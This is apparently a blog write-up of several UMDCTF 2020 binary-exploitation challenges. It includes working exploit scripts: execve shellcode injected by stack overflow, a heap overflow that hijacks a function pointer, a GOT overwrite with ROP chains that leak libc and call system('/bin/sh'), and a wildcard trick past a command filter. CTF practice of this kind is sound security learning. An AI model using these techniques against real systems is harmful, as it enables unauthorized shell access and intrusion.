# UMDCTF 2020

> Sat, April 18, 2020 18:00 — Sun, April 19, 18:00 CST 

## Easy Right? (150pt)

### Description

> The mitigations have left the room.. 
>
> `nc 142.93.113.134 9999` 
>
> Author: `moogboi`


### Attachment

[baby](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/UMDCTF2020/pwn/baby/baby)

### Analysis

```bash
% checksec baby 
[*] '/home/taqini/Downloads/UMDCTF/baby/baby'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

We know the address of `s` in stack and stack is executable, so just need to put our shellcode into `s` in stack and return to `s` by stack overflow.

```c
int __cdecl main(int argc, const char **argv, const char **envp){
  char s; // [rsp+0h] [rbp-80h]

  setbuf(stdout, 0LL);
  printf("Is this an... executable stack? %llx\n", &s);
  fgets(&s, 4919, stdin);
  return 0;
}
```

### Solution

```python
offset = 136
payload = asm('''
    /* execve(path='/bin/sh', argv=0, envp=0) */
    /* push '/bin/sh\x00' */
    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0x68732f6e69622f
    xor [rsp], rax
    mov rdi, rsp
    xor edx, edx /* 0 */
    xor esi, esi /* 0 */
    /* call execve() */
    mov rax, SYS_execve /* 0x3b */
    syscall
    ''')
payload = payload.rjust(offset,'\x90')
ru('Is this an... executable stack? ')
stack = eval('0x'+rc(12))
info_addr('stack',stack)
payload += p64(stack)
# debug('b *0x400628')
sl(payload)
```


### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/UMDCTF2020/pwn/baby) 



## Question (150pt)
### Description

> To read or not to read the flag... That is the question!
>
> `nc 192.241.138.174 9999` 
>
> Author: `lumpus`

### Analysis

We can't `cat flag.txt` directly (maybe `flag` was filtered.)

```bash
The flag.txt is here. Try to read it!
> cat flag.txt
Nope!
```

### Solution

Use  **wildcard** character to bypass check:

```bash
> cat ????????
UMDCTF-{s0me_questions_h4ve_answ3rs}
```

> question mark (?) represents any single character



## Cowspeak as a Service (250pt)

### Description

> lumpus gave up installing cowspeak so he made it a remote service instead! Too bad it keeps overwriting old  messages... Can you become chief cow and read the first message? 
>
> `nc 192.241.138.174 9998` 
>
> Author: `WittsEnd2`, `lumpus`


### Attachment

[cowsay.c](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/UMDCTF2020/pwn/cowsay/main.c)

### Analysis

I don't understand what this challenge means... so I try to brute force...

### Solution

```python
for i in range(20):
    p = remote('192.241.138.174',9998)
    offset = 64+i
    payload = 'A'*offset
    print "[+] ",i
    p.sendline(payload)
    print p.recvall()
    p.close()
```

Success while offset is 75 or 76 ... I don't actually know why...

![](http://image.taqini.space/img/20200419175050.png)

### More

> Also for the cowsay one essentially you're overwriting the `overwrite` variable in the call to setenv with a 0 so the value of $MSG isn't changed `int setenv(const char *name, const char *value, int overwrite);`
>
> -- by seamus#4468 @discord

We can look up manual of `setenv`  to learn more:

> The setenv() function adds the variable name to the environment with the value value, if name does not already exist. If name does exist in the environment, then its value is changed to value if overwrite is nonzero; **if overwrite is zero**, then **the value of name is not changed** (and setenv() returns a success status). This function makes copies of the strings pointed to by name and value (by contrast with putenv(3)).

So flag is in `$MSG` and cow will say it if we don't overwrite it :D

> Thanks seamus#4468

## shellcodia1 (300pt)

### Description

> Welcome to shellcodia, here is an opportunity to write some custom shellcode to retrieve the flag! Simply connect, submit your shellcode in binary form, and if you've  completed the challenge then a flag will return. This first challenge is to return the value 7. Now, a few things to remember, these are x64  machines so don't think you can sneak by with 32bit shellcode.  Additionally, the environment assumes nothing about the shellcode you  give it. It's highly unlikely that if you break the environment, even if you accomplished the goal, you will get the flag. 
>
> Submit your shellcode to: `157.245.88.100:7778` Good luck! 
>
> Author: `quantumite (BlueStar)` 
>
> (Note: flag is in `UMDCTF{}` format)

### Analysis

Generally, `rax` is used to storage return value. This challenge is to return the value 7. 

So, we can set `rax` to 7 by assembly language code as following: 

```nasm
xor  rax, rax
mov  al, 0x7
ret  
```

### Solution

```python
context.log_level = 'debug'
context.arch = 'amd64'

p=remote('157.245.88.100', 7778)
sc=asm('xor rax,rax\n mov al,7\nret\n')
p.sendline(sc)

p.interactive()
```

> flag: UMDCTF{R_U_@_Tim3_tR@v3ll3r_OR_Ju$t_R3a11y_Sm@rT}

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/UMDCTF2020/pwn/shellcode1) 



## Jump Not Found (400pt)

### Description

> We are trying to make a hyper jump to Naboo, but our system doesn't know where Naboo is. Can you help us figure out the issue?
>
> `nc 192.241.138.174 9996` 
>
> Author: `WittsEnd2`


### Attachment

[JNF](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/UMDCTF2020/pwn/JNF/JNF)

### Analysis

### Heap overflow

```c
  nptr = malloc(0x42uLL);
  v8 = malloc(0x18uLL);
  *v8 = jumpToHoth;
  v8[1] = jumpToCoruscant;
  v8[2] = jumpToEndor;
// ......
  gets(nptr);
```

From the code, we can see `v8` is an array of function pointer and `nptr` is a buffer.

All of them created by `malloc` and in heap.

![](http://image.taqini.space/img/20200419151918.png)

Function pointer array `v8` will be overwrite with our input after 80 bytes.

### Hidden function

If we call the hidden function `jumpToNaboo` , we can get flag.

```c
int jumpToNaboo(){
  return puts("Jumping to Naboo...\n UMDCTF-{ flag on server             }");
}
```

```nasm
.text:000000000040070A jumpToNaboo     proc near
.text:000000000040070A                 push    rbp
.text:000000000040070B                 mov     rbp, rsp
.text:000000000040070E                 mov     edi, offset aJumpingToNaboo
.text:0000000000400713                 call    _puts
.text:0000000000400718                 nop
.text:0000000000400719                 pop     rbp
.text:000000000040071A                 retn
```

### Solution

Overwrite the first function pointer in array with address of `puts(flag)` in `jumpToNaboo` and call it:

```python
payload = '1' + 'A'*79
payload += p32(0x40070E)
ru('SYSTEM CONSOLE> ')
sl(payload)
```

#### Why 0x40070E?

Because the beginning address of  `jumpToNaboo` is `0x40070A`, and `\x0a` is termination code for `gets()` which causes early termination of our input.


### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/UMDCTF2020/pwn/JNF) 



## shellcodia2 (600pt)
### Description

> Welcome back to shellcodia! You know the drill. Simply connect, submit your shellcode in binary form, and if  you've completed the challenge then a flag will return. This challenge  requires you to create a file named `strange.txt` and put the string `awesome` inside. Now, a few things to remember, these are x64 machines so don't think  you can sneak by with 32bit shellcode. Additionally, the environment  assumes nothing about the shellcode you give it. It's highly unlikely  that if you break the environment, even if you accomplished the goal,  you will get the flag. 
>
> Submit your shellcode to: `157.245.88.100:7779` Good luck! 
>
> Author: `quantumite (BlueStar)` 
>
> (Note: flag is in `UMDCTF{}` format)

### Analysis

Goal: create a file named `strange.txt` and put the string `awesome` inside.

We can use `syscall` to finish it.

```nasm
rax = SYS_creat("strange.txt",0777);
SYS_write(rax, "awesome" ,7);
```

### Solution

```nasm
push 0x1010101 ^ 0x747874
xor dword ptr [rsp], 0x1010101
mov rax, 0x2e65676e61727473
push rax
mov rdi, rsp
mov rsi, 0x1ff
/* call creat() */
mov rax, SYS_creat /* 0x55 */
syscall

mov rdi, rax   /* fd */

mov rax, 0x101010101010101
push rax
mov rax, 0x101010101010101 ^ 0x656d6f73657761
xor [rsp], rax
mov rsi, rsp
mov rdx, 0x7
/* call write() */
mov rax, SYS_write /* 1 */
syscall

/* stack balance*/
pop rcx
pop rcx
pop rcx

ret
```

> There is one thing to note in writing shellcode, stack should be **balanced** before `ret` 

> flag: UMDCTF{uu_rr_ G3tt1nG_g00d_w1tH_Th1s_$h3llc0de_stUff}

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/UMDCTF2020/pwn/shellcode2) 



## Coal Miner (800pt, unsolved)

> This wp works only in my local environment (Ubnutu19.04 libc2.29)


### Description

> First to fall over when the atmosphere is less than perfect Your sensibilities are shaken by the slightest defect 
>
> `nc 161.35.8.211 9999` 
>
> Author: `moogboi`

### Attachment

[coalminer](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/UMDCTF2020/pwn/coalminer/coalminer)

### Solution

 * buffer overflow: overwrite canary and trigger `__stack_chk_fail`
 * overwrite `got['__stack_chk_fail']` with gadget `pop-pop-pop-pop-ret`
 * execute first ropchain to leak libc and return to `_start`
 * execute second ropchain to getshell

#### rop1
```python
sla('> ','add')
sla('Enter a name: \n','TaQini__'+p64(elf. got['__stack_chk_fail']))
ropchain = p64(prdi) + p64(elf.got['puts']) + p64(elf.sym['puts']) + p64(0x400770) # _start
sla('Enter a description: ',p64(p4r)+ropchain)
ru('\n')
```

#### leak libc

```python
puts = uu64(rc(6))
info_addr('puts',puts)
libcbase = puts - libc.sym['puts']
info_addr('libcbase',libcbase)
system = libcbase + libc.sym['system']
binsh  = libcbase + libc.search("/bin/sh").next()
info_addr('system',system)
info_addr('binsh',binsh)
```

> I can't figure out the version of libc in remote so failed to attack.

#### rop2

```python
sla('> ','add')
sla('Enter a name: \n','TaQini__'+p64(elf. got['__stack_chk_fail']))
ropchain = p64(ret) + p64(prdi) + p64(binsh) + p64(system) + p64(0x400770)
sla('Enter a description: \n',p64(p4r)+ropchain)
```

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/UMDCTF2020/pwn/coalminer) 
